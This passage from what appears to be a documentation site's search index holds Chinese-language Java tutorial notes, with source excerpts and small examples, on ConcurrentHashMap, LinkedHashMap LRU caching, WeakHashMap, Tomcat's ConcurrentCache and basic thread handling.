/** * The number of elements. Accessed only either within locks * or among other volatile reads that maintain visibility. */
transient int count;
\u5728\u6267\u884C size \u64CD\u4F5C\u65F6\uFF0C\u9700\u8981\u904D\u5386\u6240\u6709 Segment \u7136\u540E\u628A count \u7D2F\u8BA1\u8D77\u6765\u3002
ConcurrentHashMap \u5728\u6267\u884C size \u64CD\u4F5C\u65F6\u5148\u5C1D\u8BD5\u4E0D\u52A0\u9501\uFF0C\u5982\u679C\u8FDE\u7EED\u4E24\u6B21\u4E0D\u52A0\u9501\u64CD\u4F5C\u5F97\u5230\u7684\u7ED3\u679C\u4E00\u81F4\uFF0C\u90A3\u4E48\u53EF\u4EE5\u8BA4\u4E3A\u8FD9\u4E2A\u7ED3\u679C\u662F\u6B63\u786E\u7684\u3002
\u5C1D\u8BD5\u6B21\u6570\u4F7F\u7528 RETRIES_BEFORE_LOCK \u5B9A\u4E49\uFF0C\u8BE5\u503C\u4E3A 2\uFF0Cretries \u521D\u59CB\u503C\u4E3A -1\uFF0C\u56E0\u6B64\u5C1D\u8BD5\u6B21\u6570\u4E3A 3\u3002
\u5982\u679C\u5C1D\u8BD5\u7684\u6B21\u6570\u8D85\u8FC7 3 \u6B21\uFF0C\u5C31\u9700\u8981\u5BF9\u6BCF\u4E2A Segment \u52A0\u9501\u3002 /** * Number of unsynchronized retries in size and containsValue * methods before resorting to locking. This is used to avoid * unbounded retries if tables undergo continuous modification * which would make it impossible to obtain an accurate result. */
static final int RETRIES_BEFORE_LOCK = 2; public int size() { // Try a few times to get accurate count. On failure due to // continuous async changes in table, resort to locking. final Segment<K,V>[] segments = this.segments; int size; boolean overflow; // true if size overflows 32 bits long sum; // sum of modCounts long last = 0L; // previous sum int retries = -1; // first iteration isn't retry try { for (;;) { // \u8D85\u8FC7\u5C1D\u8BD5\u6B21\u6570\uFF0C\u5219\u5BF9\u6BCF\u4E2A Segment \u52A0\u9501 if (retries++ == RETRIES_BEFORE_LOCK) { for (int j = 0; j < segments.length; ++j) ensureSegment(j).lock(); // force creation } sum = 0L; size = 0; overflow = false; for (int j = 0; j < segments.length; ++j) { Segment<K,V> seg = segmentAt(segments, j); if (seg != null) { sum += seg.modCount; int c = seg.count; if (c < 0 || (size += c) < 0) overflow = true; } } // \u8FDE\u7EED\u4E24\u6B21\u5F97\u5230\u7684\u7ED3\u679C\u4E00\u81F4\uFF0C\u5219\u8BA4\u4E3A\u8FD9\u4E2A\u7ED3\u679C\u662F\u6B63\u786E\u7684 if (sum == last) break; last = sum; } } finally { if (retries > RETRIES_BEFORE_LOCK) { for (int j = 0; j < segments.length; ++j) segmentAt(segments, j).unlock(); } } return overflow ? Integer.MAX_VALUE : size;
}`},{header:"3. JDK 1.8 \u7684\u6539\u52A8",slug:"_3-jdk-1-8-\u7684\u6539\u52A8",content:`JDK 1.7 \u4F7F\u7528\u5206\u6BB5\u9501\u673A\u5236\u6765\u5B9E\u73B0\u5E76\u53D1\u66F4\u65B0\u64CD\u4F5C\uFF0C\u6838\u5FC3\u7C7B\u4E3A Segment\uFF0C\u5B83\u7EE7\u627F\u81EA\u91CD\u5165\u9501 ReentrantLock\uFF0C\u5E76\u53D1\u5EA6\u4E0E Segment \u6570\u91CF\u76F8\u7B49\u3002
JDK 1.8 \u4F7F\u7528\u4E86 CAS \u64CD\u4F5C\u6765\u652F\u6301\u66F4\u9AD8\u7684\u5E76\u53D1\u5EA6\uFF0C\u5728 CAS \u64CD\u4F5C\u5931\u8D25\u65F6\u4F7F\u7528\u5185\u7F6E\u9501 synchronized\u3002
\u5E76\u4E14 JDK 1.8 \u7684\u5B9E\u73B0\u4E5F\u5728\u94FE\u8868\u8FC7\u957F\u65F6\u4F1A\u8F6C\u6362\u4E3A\u7EA2\u9ED1\u6811\u3002`},{header:"LinkedHashMap",slug:"linkedhashmap",content:""},{header:"\u5B58\u50A8\u7ED3\u6784",slug:"\u5B58\u50A8\u7ED3\u6784",content:`\u7EE7\u627F\u81EA HashMap\uFF0C\u56E0\u6B64\u5177\u6709\u548C HashMap \u4E00\u6837\u7684\u5FEB\u901F\u67E5\u627E\u7279\u6027\u3002
public class LinkedHashMap<K,V> extends HashMap<K,V> implements Map<K,V>
\u5185\u90E8\u7EF4\u62A4\u4E86\u4E00\u4E2A\u53CC\u5411\u94FE\u8868\uFF0C\u7528\u6765\u7EF4\u62A4\u63D2\u5165\u987A\u5E8F\u6216\u8005 LRU \u987A\u5E8F\u3002
/** * The head (eldest) of the doubly linked list. */
transient LinkedHashMap.Entry<K,V> head; /** * The tail (youngest) of the doubly linked list. */
transient LinkedHashMap.Entry<K,V> tail;
accessOrder \u51B3\u5B9A\u4E86\u987A\u5E8F\uFF0C\u9ED8\u8BA4\u4E3A false\uFF0C\u6B64\u65F6\u7EF4\u62A4\u7684\u662F\u63D2\u5165\u987A\u5E8F\u3002
final boolean accessOrder;
LinkedHashMap \u6700\u91CD\u8981\u7684\u662F\u4EE5\u4E0B\u7528\u4E8E\u7EF4\u62A4\u987A\u5E8F\u7684\u51FD\u6570\uFF0C\u5B83\u4EEC\u4F1A\u5728 put\u3001get \u7B49\u65B9\u6CD5\u4E2D\u8C03\u7528\u3002
void afterNodeAccess(Node<K,V> p) { }
void afterNodeInsertion(boolean evict) { }`},{header:"afterNodeAccess()",slug:"afternodeaccess",content:`\u5F53\u4E00\u4E2A\u8282\u70B9\u88AB\u8BBF\u95EE\u65F6\uFF0C\u5982\u679C accessOrder \u4E3A true\uFF0C\u5219\u4F1A\u5C06\u8BE5\u8282\u70B9\u79FB\u5230\u94FE\u8868\u5C3E\u90E8\u3002\u4E5F\u5C31\u662F\u8BF4\u6307\u5B9A\u4E3A LRU \u987A\u5E8F\u4E4B\u540E\uFF0C\u5728\u6BCF\u6B21\u8BBF\u95EE\u4E00\u4E2A\u8282\u70B9\u65F6\uFF0C\u4F1A\u5C06\u8FD9\u4E2A\u8282\u70B9\u79FB\u5230\u94FE\u8868\u5C3E\u90E8\uFF0C\u4FDD\u8BC1\u94FE\u8868\u5C3E\u90E8\u662F\u6700\u8FD1\u8BBF\u95EE\u7684\u8282\u70B9\uFF0C\u90A3\u4E48\u94FE\u8868\u9996\u90E8\u5C31\u662F\u6700\u8FD1\u6700\u4E45\u672A\u4F7F\u7528\u7684\u8282\u70B9\u3002
void afterNodeAccess(Node<K,V> e) { // move node to last LinkedHashMap.Entry<K,V> last; if (accessOrder && (last = tail) != e) { LinkedHashMap.Entry<K,V> p = (LinkedHashMap.Entry<K,V>)e, b = p.before, a = p.after; p.after = null; if (b == null) head = a; else b.after = a; if (a != null) a.before = b; else last = b; if (last == null) head = p; else { p.before = last; last.after = p; } tail = p; ++modCount; }
}`},{header:"afterNodeInsertion()",slug:"afternodeinsertion",content:`\u5728 put \u7B49\u64CD\u4F5C\u4E4B\u540E\u6267\u884C\uFF0C\u5F53 removeEldestEntry() \u65B9\u6CD5\u8FD4\u56DE true \u65F6\u4F1A\u79FB\u9664\u6700\u665A\u7684\u8282\u70B9\uFF0C\u4E5F\u5C31\u662F\u94FE\u8868\u9996\u90E8\u8282\u70B9 first\u3002
evict \u53EA\u6709\u5728\u6784\u5EFA Map \u7684\u65F6\u5019\u624D\u4E3A false\uFF0C\u5728\u8FD9\u91CC\u4E3A true\u3002
void afterNodeInsertion(boolean evict) { // possibly remove eldest LinkedHashMap.Entry<K,V> first; if (evict && (first = head) != null && removeEldestEntry(first)) { K key = first.key; removeNode(hash(key), key, null, false, true); }
}
removeEldestEntry() \u9ED8\u8BA4\u4E3A false\uFF0C\u5982\u679C\u9700\u8981\u8BA9\u5B83\u4E3A true\uFF0C\u9700\u8981\u7EE7\u627F LinkedHashMap \u5E76\u4E14\u8986\u76D6\u8FD9\u4E2A\u65B9\u6CD5\u7684\u5B9E\u73B0\uFF0C\u8FD9\u5728\u5B9E\u73B0 LRU \u7684\u7F13\u5B58\u4E2D\u7279\u522B\u6709\u7528\uFF0C\u901A\u8FC7\u79FB\u9664\u6700\u8FD1\u6700\u4E45\u672A\u4F7F\u7528\u7684\u8282\u70B9\uFF0C\u4ECE\u800C\u4FDD\u8BC1\u7F13\u5B58\u7A7A\u95F4\u8DB3\u591F\uFF0C\u5E76\u4E14\u7F13\u5B58\u7684\u6570\u636E\u90FD\u662F\u70ED\u70B9\u6570\u636E\u3002
protected boolean removeEldestEntry(Map.Entry<K,V> eldest) { return false;
}`},{header:"LRU \u7F13\u5B58",slug:"lru-\u7F13\u5B58",content:`\u4EE5\u4E0B\u662F\u4F7F\u7528 LinkedHashMap \u5B9E\u73B0\u7684\u4E00\u4E2A LRU \u7F13\u5B58\uFF1A \u8BBE\u5B9A\u6700\u5927\u7F13\u5B58\u7A7A\u95F4 MAX_ENTRIES \u4E3A 3\uFF1B
\u4F7F\u7528 LinkedHashMap \u7684\u6784\u9020\u51FD\u6570\u5C06 accessOrder \u8BBE\u7F6E\u4E3A true\uFF0C\u5F00\u542F LRU \u987A\u5E8F\uFF1B
\u8986\u76D6 removeEldestEntry() \u65B9\u6CD5\u5B9E\u73B0\uFF0C\u5728\u8282\u70B9\u591A\u4E8E MAX_ENTRIES \u5C31\u4F1A\u5C06\u6700\u8FD1\u6700\u4E45\u672A\u4F7F\u7528\u7684\u6570\u636E\u79FB\u9664\u3002 class LRUCache<K, V> extends LinkedHashMap<K, V> { private static final int MAX_ENTRIES = 3; protected boolean removeEldestEntry(Map.Entry eldest) { return size() > MAX_ENTRIES; } LRUCache() { super(MAX_ENTRIES, 0.75f, true); }
}
public static void main(String[] args) { LRUCache<Integer, String> cache = new LRUCache<>(); cache.put(1, "a"); cache.put(2, "b"); cache.put(3, "c"); cache.get(1); cache.put(4, "d"); System.out.println(cache.keySet());
}
[3, 1, 4]`},{header:"WeakHashMap",slug:"weakhashmap",content:""},{header:"\u5B58\u50A8\u7ED3\u6784",slug:"\u5B58\u50A8\u7ED3\u6784-1",content:`WeakHashMap \u7684 Entry \u7EE7\u627F\u81EA WeakReference\uFF0C\u88AB WeakReference \u5173\u8054\u7684\u5BF9\u8C61\u5728\u4E0B\u4E00\u6B21\u5783\u573E\u56DE\u6536\u65F6\u4F1A\u88AB\u56DE\u6536\u3002
WeakHashMap \u4E3B\u8981\u7528\u6765\u5B9E\u73B0\u7F13\u5B58\uFF0C\u901A\u8FC7\u4F7F\u7528 WeakHashMap \u6765\u5F15\u7528\u7F13\u5B58\u5BF9\u8C61\uFF0C\u7531 JVM \u5BF9\u8FD9\u90E8\u5206\u7F13\u5B58\u8FDB\u884C\u56DE\u6536\u3002
private static class Entry<K,V> extends WeakReference<Object> implements Map.Entry<K,V>`},{header:"ConcurrentCache",slug:"concurrentcache",content:`Tomcat \u4E2D\u7684 ConcurrentCache \u4F7F\u7528\u4E86 WeakHashMap \u6765\u5B9E\u73B0\u7F13\u5B58\u529F\u80FD\u3002
ConcurrentCache \u91C7\u53D6\u7684\u662F\u5206\u4EE3\u7F13\u5B58\uFF1A \u7ECF\u5E38\u4F7F\u7528\u7684\u5BF9\u8C61\u653E\u5165 eden \u4E2D\uFF0Ceden \u4F7F\u7528 ConcurrentHashMap \u5B9E\u73B0\uFF0C\u4E0D\u7528\u62C5\u5FC3\u4F1A\u88AB\u56DE\u6536\uFF08\u4F0A\u7538\u56ED\uFF09\uFF1B
\u4E0D\u5E38\u7528\u7684\u5BF9\u8C61\u653E\u5165 longterm\uFF0Clongterm \u4F7F\u7528 WeakHashMap \u5B9E\u73B0\uFF0C\u8FD9\u4E9B\u8001\u5BF9\u8C61\u4F1A\u88AB\u5783\u573E\u6536\u96C6\u5668\u56DE\u6536\u3002
\u5F53\u8C03\u7528 get() \u65B9\u6CD5\u65F6\uFF0C\u4F1A\u5148\u4ECE eden \u533A\u83B7\u53D6\uFF0C\u5982\u679C\u6CA1\u6709\u627E\u5230\u7684\u8BDD\u518D\u5230 longterm \u83B7\u53D6\uFF0C\u5F53\u4ECE longterm \u83B7\u53D6\u5230\u5C31\u628A\u5BF9\u8C61\u653E\u5165 eden \u4E2D\uFF0C\u4ECE\u800C\u4FDD\u8BC1\u7ECF\u5E38\u88AB\u8BBF\u95EE\u7684\u8282\u70B9\u4E0D\u5BB9\u6613\u88AB\u56DE\u6536\u3002
\u5F53\u8C03\u7528 put() \u65B9\u6CD5\u65F6\uFF0C\u5982\u679C eden \u7684\u5927\u5C0F\u8D85\u8FC7\u4E86 size\uFF0C\u90A3\u4E48\u5C31\u5C06 eden \u4E2D\u7684\u6240\u6709\u5BF9\u8C61\u90FD\u653E\u5165 longterm \u4E2D\uFF0C\u5229\u7528\u865A\u62DF\u673A\u56DE\u6536\u6389\u4E00\u90E8\u5206\u4E0D\u7ECF\u5E38\u4F7F\u7528\u7684\u5BF9\u8C61\u3002 public final class ConcurrentCache<K, V> { private final int size; private final Map<K, V> eden; private final Map<K, V> longterm; public ConcurrentCache(int size) { this.size = size; this.eden = new ConcurrentHashMap<>(size); this.longterm = new WeakHashMap<>(size); } public V get(K k) { V v = this.eden.get(k); if (v == null) { v = this.longterm.get(k); if (v != null) this.eden.put(k, v); } return v; } public void put(K k, V v) { if (this.eden.size() >= size) { this.longterm.putAll(this.eden); this.eden.clear(); } this.eden.put(k, v); }
}`},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:`Eckel B. Java \u7F16\u7A0B\u601D\u60F3 [M]. \u673A\u68B0\u5DE5\u4E1A\u51FA\u7248\u793E, 2002.
Java Collection Framework
Iterator \u6A21\u5F0F
Java 8 \u7CFB\u5217\u4E4B\u91CD\u65B0\u8BA4\u8BC6 HashMap
What is difference between HashMap and Hashtable in Java?
Java \u96C6\u5408\u4E4B HashMap
The principle of ConcurrentHashMap analysis
\u63A2\u7D22 ConcurrentHashMap \u9AD8\u5E76\u53D1\u6027\u7684\u5B9E\u73B0\u673A\u5236
HashMap \u76F8\u5173\u9762\u8BD5\u9898\u53CA\u5176\u89E3\u7B54
Java \u96C6\u5408\u7EC6\u8282\uFF08\u4E8C\uFF09\uFF1AasList \u7684\u7F3A\u9677
Java Collection Framework \u2013 The LinkedList Class`}]},{path:"/java/Java%20%E5%B9%B6%E5%8F%91.html",title:"Java \u5E76\u53D1",pathLocale:"/",contents:[{header:"Java \u5E76\u53D1",slug:"java-\u5E76\u53D1",content:`Java \u5E76\u53D1 \u4E00\u3001\u4F7F\u7528\u7EBF\u7A0B \u5B9E\u73B0 Runnable \u63A5\u53E3
\u5B9E\u73B0 Callable \u63A5\u53E3
\u7EE7\u627F Thread \u7C7B
\u5B9E\u73B0\u63A5\u53E3 VS \u7EE7\u627F Thread \u4E8C\u3001\u57FA\u7840\u7EBF\u7A0B\u673A\u5236 Executor
Daemon
sleep()
yield() \u4E09\u3001\u4E2D\u65AD InterruptedException
interrupted()
Executor \u7684\u4E2D\u65AD\u64CD\u4F5C \u56DB\u3001\u4E92\u65A5\u540C\u6B65 synchronized
ReentrantLock
\u6BD4\u8F83
\u4F7F\u7528\u9009\u62E9 \u4E94\u3001\u7EBF\u7A0B\u4E4B\u95F4\u7684\u534F\u4F5C join()
wait() notify() notifyAll()
await() signal() signalAll() \u516D\u3001\u7EBF\u7A0B\u72B6\u6001 \u65B0\u5EFA\uFF08NEW\uFF09
\u53EF\u8FD0\u884C\uFF08RUNABLE\uFF09
\u963B\u585E\uFF08BLOCKED\uFF09
\u65E0\u9650\u671F\u7B49\u5F85\uFF08WAITING\uFF09
\u9650\u671F\u7B49\u5F85\uFF08TIMED_WAITING\uFF09
\u6B7B\u4EA1\uFF08TERMINATED\uFF09 \u4E03\u3001J.U.C - AQS CountDownLatch
CyclicBarrier
Semaphore \u516B\u3001J.U.C - \u5176\u5B83\u7EC4\u4EF6 FutureTask
BlockingQueue
ForkJoin \u4E5D\u3001\u7EBF\u7A0B\u4E0D\u5B89\u5168\u793A\u4F8B
\u5341\u3001Java \u5185\u5B58\u6A21\u578B \u4E3B\u5185\u5B58\u4E0E\u5DE5\u4F5C\u5185\u5B58
\u5185\u5B58\u95F4\u4EA4\u4E92\u64CD\u4F5C
\u5185\u5B58\u6A21\u578B\u4E09\u5927\u7279\u6027
\u5148\u884C\u53D1\u751F\u539F\u5219 \u5341\u4E00\u3001\u7EBF\u7A0B\u5B89\u5168 \u4E0D\u53EF\u53D8
\u4E92\u65A5\u540C\u6B65
\u975E\u963B\u585E\u540C\u6B65
\u65E0\u540C\u6B65\u65B9\u6848 \u5341\u4E8C\u3001\u9501\u4F18\u5316 \u81EA\u65CB\u9501
\u9501\u6D88\u9664
\u9501\u7C97\u5316
\u8F7B\u91CF\u7EA7\u9501
\u504F\u5411\u9501 \u5341\u4E09\u3001\u591A\u7EBF\u7A0B\u5F00\u53D1\u826F\u597D\u7684\u5B9E\u8DF5
\u53C2\u8003\u8D44\u6599`},{header:"\u4E00\u3001\u4F7F\u7528\u7EBF\u7A0B",slug:"\u4E00\u3001\u4F7F\u7528\u7EBF\u7A0B",content:`\u6709\u4E09\u79CD\u4F7F\u7528\u7EBF\u7A0B\u7684\u65B9\u6CD5\uFF1A \u5B9E\u73B0 Runnable \u63A5\u53E3\uFF1B
\u5B9E\u73B0 Callable \u63A5\u53E3\uFF1B
\u7EE7\u627F Thread \u7C7B\u3002 \u5B9E\u73B0 Runnable \u548C Callable \u63A5\u53E3\u7684\u7C7B\u53EA\u80FD\u5F53\u505A\u4E00\u4E2A\u53EF\u4EE5\u5728\u7EBF\u7A0B\u4E2D\u8FD0\u884C\u7684\u4EFB\u52A1\uFF0C\u4E0D\u662F\u771F\u6B63\u610F\u4E49\u4E0A\u7684\u7EBF\u7A0B\uFF0C\u56E0\u6B64\u6700\u540E\u8FD8\u9700\u8981\u901A\u8FC7 Thread \u6765\u8C03\u7528\u3002\u53EF\u4EE5\u7406\u89E3\u4E3A\u4EFB\u52A1\u662F\u901A\u8FC7\u7EBF\u7A0B\u9A71\u52A8\u4ECE\u800C\u6267\u884C\u7684\u3002`},{header:"\u5B9E\u73B0 Runnable \u63A5\u53E3",slug:"\u5B9E\u73B0-runnable-\u63A5\u53E3",content:`\u9700\u8981\u5B9E\u73B0\u63A5\u53E3\u4E2D\u7684 run() \u65B9\u6CD5\u3002
public class MyRunnable implements Runnable { @Override public void run() { // ... }
}
\u4F7F\u7528 Runnable \u5B9E\u4F8B\u518D\u521B\u5EFA\u4E00\u4E2A Thread \u5B9E\u4F8B\uFF0C\u7136\u540E\u8C03\u7528 Thread \u5B9E\u4F8B\u7684 start() \u65B9\u6CD5\u6765\u542F\u52A8\u7EBF\u7A0B\u3002
public static void main(String[] args) { MyRunnable instance = new MyRunnable(); Thread thread = new Thread(instance); thread.start();
}`},{header:"\u5B9E\u73B0 Callable \u63A5\u53E3",slug:"\u5B9E\u73B0-callable-\u63A5\u53E3",content:`\u4E0E Runnable \u76F8\u6BD4\uFF0CCallable \u53EF\u4EE5\u6709\u8FD4\u56DE\u503C\uFF0C\u8FD4\u56DE\u503C\u901A\u8FC7 FutureTask \u8FDB\u884C\u5C01\u88C5\u3002
public class MyCallable implements Callable<Integer> { public Integer call() { return 123; }
}
public static void main(String[] args) throws ExecutionException, InterruptedException { MyCallable mc = new MyCallable(); FutureTask<Integer> ft = new FutureTask<>(mc); Thread thread = new Thread(ft); thread.start(); System.out.println(ft.get());
}`},{header:"\u7EE7\u627F Thread \u7C7B",slug:"\u7EE7\u627F-thread-\u7C7B",content:`\u540C\u6837\u4E5F\u662F\u9700\u8981\u5B9E\u73B0 run() \u65B9\u6CD5\uFF0C\u56E0\u4E3A Thread \u7C7B\u4E5F\u5B9E\u73B0\u4E86 Runable \u63A5\u53E3\u3002
\u5F53\u8C03\u7528 start() \u65B9\u6CD5\u542F\u52A8\u4E00\u4E2A\u7EBF\u7A0B\u65F6\uFF0C\u865A\u62DF\u673A\u4F1A\u5C06\u8BE5\u7EBF\u7A0B\u653E\u5165\u5C31\u7EEA\u961F\u5217\u4E2D\u7B49\u5F85\u88AB\u8C03\u5EA6\uFF0C\u5F53\u4E00\u4E2A\u7EBF\u7A0B\u88AB\u8C03\u5EA6\u65F6\u4F1A\u6267\u884C\u8BE5\u7EBF\u7A0B\u7684 run() \u65B9\u6CD5\u3002
public class MyThread extends Thread { public void run() { // ... }
}
public static void main(String[] args) { MyThread mt = new MyThread(); mt.start();
}`},{header:"\u5B9E\u73B0\u63A5\u53E3 VS \u7EE7\u627F Thread",slug:"\u5B9E\u73B0\u63A5\u53E3-vs-\u7EE7\u627F-thread",content:`\u5B9E\u73B0\u63A5\u53E3\u4F1A\u66F4\u597D\u4E00\u4E9B\uFF0C\u56E0\u4E3A\uFF1A Java \u4E0D\u652F\u6301\u591A\u91CD\u7EE7\u627F\uFF0C\u56E0\u6B64\u7EE7\u627F\u4E86 Thread \u7C7B\u5C31\u65E0\u6CD5\u7EE7\u627F\u5176\u5B83\u7C7B\uFF0C\u4F46\u662F\u53EF\u4EE5\u5B9E\u73B0\u591A\u4E2A\u63A5\u53E3\uFF1B
\u7C7B\u53EF\u80FD\u53EA\u8981\u6C42\u53EF\u6267\u884C\u5C31\u884C\uFF0C\u7EE7\u627F\u6574\u4E2A Thread \u7C7B\u5F00\u9500\u8FC7\u5927\u3002`},{header:"\u4E8C\u3001\u57FA\u7840\u7EBF\u7A0B\u673A\u5236",slug:"\u4E8C\u3001\u57FA\u7840\u7EBF\u7A0B\u673A\u5236",content:""},{header:"Executor",slug:"executor",content:`Executor \u7BA1\u7406\u591A\u4E2A\u5F02\u6B65\u4EFB\u52A1\u7684\u6267\u884C\uFF0C\u800C\u65E0\u9700\u7A0B\u5E8F\u5458\u663E\u5F0F\u5730\u7BA1\u7406\u7EBF\u7A0B\u7684\u751F\u547D\u5468\u671F\u3002\u8FD9\u91CC\u7684\u5F02\u6B65\u662F\u6307\u591A\u4E2A\u4EFB\u52A1\u7684\u6267\u884C\u4E92\u4E0D\u5E72\u6270\uFF0C\u4E0D\u9700\u8981\u8FDB\u884C\u540C\u6B65\u64CD\u4F5C\u3002
\u4E3B\u8981\u6709\u4E09\u79CD Executor\uFF1A CachedThreadPool\uFF1A\u4E00\u4E2A\u4EFB\u52A1\u521B\u5EFA\u4E00\u4E2A\u7EBF\u7A0B\uFF1B
FixedThreadPool\uFF1A\u6240\u6709\u4EFB\u52A1\u53EA\u80FD\u4F7F\u7528\u56FA\u5B9A\u5927\u5C0F\u7684\u7EBF\u7A0B\uFF1B
SingleThreadExecutor\uFF1A\u76F8\u5F53\u4E8E\u5927\u5C0F\u4E3A 1 \u7684 FixedThreadPool\u3002 public static void main(String[] args) { ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i < 5; i++) { executorService.execute(new MyRunnable()); } executorService.shutdown();
}`},{header:"Daemon",slug:"daemon",content:`\u5B88\u62A4\u7EBF\u7A0B\u662F\u7A0B\u5E8F\u8FD0\u884C\u65F6\u5728\u540E\u53F0\u63D0\u4F9B\u670D\u52A1\u7684\u7EBF\u7A0B\uFF0C\u4E0D\u5C5E\u4E8E\u7A0B\u5E8F\u4E2D\u4E0D\u53EF\u6216\u7F3A\u7684\u90E8\u5206\u3002
\u5F53\u6240\u6709\u975E\u5B88\u62A4\u7EBF\u7A0B\u7ED3\u675F\u65F6\uFF0C\u7A0B\u5E8F\u4E5F\u5C31\u7EC8\u6B62\uFF0C\u540C\u65F6\u4F1A\u6740\u6B7B\u6240\u6709\u5B88\u62A4\u7EBF\u7A0B\u3002
main() \u5C5E\u4E8E\u975E\u5B88\u62A4\u7EBF\u7A0B\u3002
\u5728\u7EBF\u7A0B\u542F\u52A8\u4E4B\u524D\u4F7F\u7528 setDaemon() \u65B9\u6CD5\u53EF\u4EE5\u5C06\u4E00\u4E2A\u7EBF\u7A0B\u8BBE\u7F6E\u4E3A\u5B88\u62A4\u7EBF\u7A0B\u3002
public static void main(String[] args) { Thread thread = new Thread(new MyRunnable()); thread.setDaemon(true);
}`},{header:"sleep()",slug:"sleep",content:`Thread.sleep(millisec) \u65B9\u6CD5\u4F1A\u4F11\u7720\u5F53\u524D\u6B63\u5728\u6267\u884C\u7684\u7EBF\u7A0B\uFF0Cmillisec \u5355\u4F4D\u4E3A\u6BEB\u79D2\u3002
sleep() \u53EF\u80FD\u4F1A\u629B\u51FA InterruptedException\uFF0C\u56E0\u4E3A\u5F02\u5E38\u4E0D\u80FD\u8DE8\u7EBF\u7A0B\u4F20\u64AD\u56DE main() \u4E2D\uFF0C\u56E0\u6B64\u5FC5\u987B\u5728\u672C\u5730\u8FDB\u884C\u5904\u7406\u3002\u7EBF\u7A0B\u4E2D\u629B\u51FA\u7684\u5176\u5B83\u5F02\u5E38\u4E5F\u540C\u6837\u9700\u8981\u5728\u672C\u5730\u8FDB\u884C\u5904\u7406\u3002
public void run() { try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); }
}`},{header:"yield()",slug:"yield",content:`\u5BF9\u9759\u6001\u65B9\u6CD5 Thread.yield() \u7684\u8C03\u7528\u58F0\u660E\u4E86\u5F53\u524D\u7EBF\u7A0B\u5DF2\u7ECF\u5B8C\u6210\u4E86\u751F\u547D\u5468\u671F\u4E2D\u6700\u91CD\u8981\u7684\u90E8\u5206\uFF0C\u53EF\u4EE5\u5207\u6362\u7ED9\u5176\u5B83\u7EBF\u7A0B\u6765\u6267\u884C\u3002\u8BE5\u65B9\u6CD5\u53EA\u662F\u5BF9\u7EBF\u7A0B\u8C03\u5EA6\u5668\u7684\u4E00\u4E2A\u5EFA\u8BAE\uFF0C\u800C\u4E14\u4E5F\u53EA\u662F\u5EFA\u8BAE\u5177\u6709\u76F8\u540C\u4F18\u5148\u7EA7\u7684\u5176\u5B83\u7EBF\u7A0B\u53EF\u4EE5\u8FD0\u884C\u3002
public void run() { Thread.yield();
}`},{header:"\u4E09\u3001\u4E2D\u65AD",slug:"\u4E09\u3001\u4E2D\u65AD",content:"\u4E00\u4E2A\u7EBF\u7A0B\u6267\u884C\u5B8C\u6BD5\u4E4B\u540E\u4F1A\u81EA\u52A8\u7ED3\u675F\uFF0C\u5982\u679C\u5728\u8FD0\u884C\u8FC7\u7A0B\u4E2D\u53D1\u751F\u5F02\u5E38\u4E5F\u4F1A\u63D0\u524D\u7ED3\u675F\u3002"},{header:"InterruptedException",slug:"interruptedexception",content:`\u901A\u8FC7\u8C03\u7528\u4E00\u4E2A\u7EBF\u7A0B\u7684 interrupt() \u6765\u4E2D\u65AD\u8BE5\u7EBF\u7A0B\uFF0C\u5982\u679C\u8BE5\u7EBF\u7A0B\u5904\u4E8E\u963B\u585E\u3001\u9650\u671F\u7B49\u5F85\u6216\u8005\u65E0\u9650\u671F\u7B49\u5F85\u72B6\u6001\uFF0C\u90A3\u4E48\u5C31\u4F1A\u629B\u51FA InterruptedException\uFF0C\u4ECE\u800C\u63D0\u524D\u7ED3\u675F\u8BE5\u7EBF\u7A0B\u3002\u4F46\u662F\u4E0D\u80FD\u4E2D\u65AD I/O \u963B\u585E\u548C synchronized \u9501\u963B\u585E\u3002
\u5BF9\u4E8E\u4EE5\u4E0B\u4EE3\u7801\uFF0C\u5728 main() \u4E2D\u542F\u52A8\u4E00\u4E2A\u7EBF\u7A0B\u4E4B\u540E\u518D\u4E2D\u65AD\u5B83\uFF0C\u7531\u4E8E\u7EBF\u7A0B\u4E2D\u8C03\u7528\u4E86 Thread.sleep() \u65B9\u6CD5\uFF0C\u56E0\u6B64\u4F1A\u629B\u51FA\u4E00\u4E2A InterruptedException\uFF0C\u4ECE\u800C\u63D0\u524D\u7ED3\u675F\u7EBF\u7A0B\uFF0C\u4E0D\u6267\u884C\u4E4B\u540E\u7684\u8BED\u53E5\u3002
public class InterruptExample { private static class MyThread1 extends Thread { @Override public void run() { try { Thread.sleep(2000); System.out.println("Thread run"); } catch (InterruptedException e) { e.printStackTrace(); } } }
}
public static void main(String[] args) throws InterruptedException { Thread thread1 = new MyThread1(); thread1.start(); thread1.interrupt(); System.out.println("Main run");
}
Main run
java.lang.InterruptedException: sleep interrupted at java.lang.Thread.sleep(Native Method) at InterruptExample.lambda$main$0(InterruptExample.java:5) at InterruptExample$$Lambda$1/713338599.run(Unknown Source) at java.lang.Thread.run(Thread.java:745)`},{header:"interrupted()",slug:"interrupted",content:`\u5982\u679C\u4E00\u4E2A\u7EBF\u7A0B\u7684 run() \u65B9\u6CD5\u6267\u884C\u4E00\u4E2A\u65E0\u9650\u5FAA\u73AF\uFF0C\u5E76\u4E14\u6CA1\u6709\u6267\u884C sleep() \u7B49\u4F1A\u629B\u51FA InterruptedException \u7684\u64CD\u4F5C\uFF0C\u90A3\u4E48\u8C03\u7528\u7EBF\u7A0B\u7684 interrupt() \u65B9\u6CD5\u5C31\u65E0\u6CD5\u4F7F\u7EBF\u7A0B\u63D0\u524D\u7ED3\u675F\u3002
\u4F46\u662F\u8C03\u7528 interrupt() \u65B9\u6CD5\u4F1A\u8BBE\u7F6E\u7EBF\u7A0B\u7684\u4E2D\u65AD\u6807\u8BB0\uFF0C\u6B64\u65F6\u8C03\u7528 interrupted() \u65B9\u6CD5\u4F1A\u8FD4\u56DE true\u3002\u56E0\u6B64\u53EF\u4EE5\u5728\u5FAA\u73AF\u4F53\u4E2D\u4F7F\u7528 interrupted() \u65B9\u6CD5\u6765\u5224\u65AD\u7EBF\u7A0B\u662F\u5426\u5904\u4E8E\u4E2D\u65AD\u72B6\u6001\uFF0C\u4ECE\u800C\u63D0\u524D\u7ED3\u675F\u7EBF\u7A0B\u3002
public class InterruptExample { private static class MyThread2 extends Thread { @Override public void run() { while (!interrupted()) { // .. } System.out.println("Thread end"); } }
}
public static void main(String[] args) throws InterruptedException { Thread thread2 = new MyThread2(); thread2.start(); thread2.interrupt();
}
